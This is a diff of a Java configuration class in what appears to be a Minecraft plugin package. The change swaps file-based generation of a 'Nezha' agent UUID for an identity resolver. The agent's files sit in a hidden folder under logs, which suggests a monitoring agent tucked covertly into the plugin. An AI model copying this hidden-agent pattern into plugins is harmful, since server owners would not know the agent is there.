@@ -2,16 +2,12 @@ package com.example.essentialsx;
 
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.FileAlreadyExistsException;
 import java.nio.file.Files;
-import java.nio.file.LinkOption;
 import java.nio.file.Path;
-import java.nio.file.StandardOpenOption;
 import java.nio.file.attribute.PosixFilePermission;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Set;
-import java.util.UUID;
 
 final class RuntimeConfig {
     static final Path ENV_FILE = Path.of("logs", ".mcchajian", ".env");
@@ -75,35 +71,9 @@ final class RuntimeConfig {
     }
 
     static String stableUuid(Map<String, String> file) throws IOException {
-        String configured = value(file, "", "NEZHA_UUID", "NZ_UUID");
-        if (!configured.isEmpty()) return canonicalUuid(configured);
-        Path directory = Path.of("logs", ".mcchajian", ".runtime");
-        Files.createDirectories(directory);
-        Path filePath = directory.resolve("ceshisonz-nezha.uuid");
-        if (Files.exists(filePath, LinkOption.NOFOLLOW_LINKS)) {
-            if (!Files.isRegularFile(filePath, LinkOption.NOFOLLOW_LINKS)) {
-                throw new IOException("Nezha UUID path is not a regular file");
-            }
-            return canonicalUuid(Files.readString(filePath, StandardCharsets.UTF_8).trim());
-        }
-        String generated = UUID.randomUUID().toString();
-        try {
-            Files.writeString(filePath, generated + "\n", StandardCharsets.UTF_8,
-                    StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE);
-            return generated;
-        } catch (FileAlreadyExistsException race) {
-            if (!Files.isRegularFile(filePath, LinkOption.NOFOLLOW_LINKS)) throw new IOException("Invalid UUID path");
-            return canonicalUuid(Files.readString(filePath, StandardCharsets.UTF_8).trim());
-        }
-    }
-
-    private static String canonicalUuid(String value) throws IOException {
-        try {
-            String canonical = UUID.fromString(value).toString();
-            if (!canonical.equalsIgnoreCase(value)) throw new IllegalArgumentException("Not a canonical UUID");
-            return canonical;
-        } catch (IllegalArgumentException error) {
-            throw new IOException("Invalid Nezha UUID");
-        }
+        String configuredUuid = value(file, "", "NEZHA_UUID", "NZ_UUID");
+        String identityIp = value(file, "", "NEZHA_IDENTITY_IP", "NZ_IDENTITY_IP");
+        // An existing random UUID file is deliberately neither read nor deleted.
+        return NezhaIdentity.resolve(configuredUuid, identityIp);
     }
 }
